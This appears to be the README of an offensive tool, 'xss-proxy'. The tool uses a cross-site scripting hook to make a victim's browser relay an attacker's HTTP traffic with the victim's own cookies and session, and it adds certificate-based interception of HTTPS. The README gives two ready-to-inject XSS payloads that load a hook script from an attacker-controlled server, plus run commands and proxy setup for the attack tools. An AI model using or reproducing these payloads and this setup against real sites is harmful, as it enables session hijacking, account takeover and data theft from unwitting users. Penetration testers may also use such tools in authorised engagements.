# xss-proxy

An HTTP proxy that routes all traffic through a browser hooked via XSS. The victim's browser executes every request with its own cookies and session.

## How it works

1. Inject `hook.js` into a target page via an XSS vulnerability
2. The victim's browser connects back to xss-proxy over WebSocket
3. Configure your tools (curl, browser, Burp) to use xss-proxy as an HTTP proxy
4. All proxy traffic is forwarded through the victim's browser via `fetch()`

```
Attacker tools  -->  xss-proxy server  --[WebSocket]-->  Victim browser  -->  Target app
```

## Install

```bash
npm install
```

## Usage

### HTTP mode

```bash
node server.js --port 8080
```

### HTTPS mode

Generate a server certificate first, then:

```bash
node server.js --https --port 8443 --cert server.crt --key server.key
```

### Options

| Flag | Default | Description |
|------|---------|-------------|
| `--port` | `8080` | Listen port |
| `--https` | off | Enable HTTPS for the proxy listener |
| `--cert` | - | TLS certificate file (required with `--https`) |
| `--key` | - | TLS private key file (required with `--https`) |
| `--timeout` | `30000` | Request timeout in ms |

## XSS payload

Inject one of these into the target page:

```html
<script src="http://YOUR-SERVER:8080/hook.js"></script>
```

```html
<img src=x onerror="s=document.createElement('script');s.src='http://YOUR-SERVER:8080/hook.js';document.head.appendChild(s)">
```

## HTTPS target sites (MITM)

When proxying HTTPS targets, xss-proxy performs MITM with dynamically generated certificates. On startup it writes `ca.crt` — import this into your browser/tools as a trusted CA.

```bash
# curl example
curl --proxy http://localhost:8080 --cacert ca.crt https://target.example.com/
```

## Proxy configuration examples

```bash
# curl via HTTP proxy
curl --proxy http://localhost:8080 http://target.example.com/

# Environment variable
export http_proxy=http://localhost:8080
export https_proxy=http://localhost:8080

# Firefox: Settings > Network > Manual Proxy Configuration
# Burp: Project Options > Connections > Upstream Proxy Servers
```
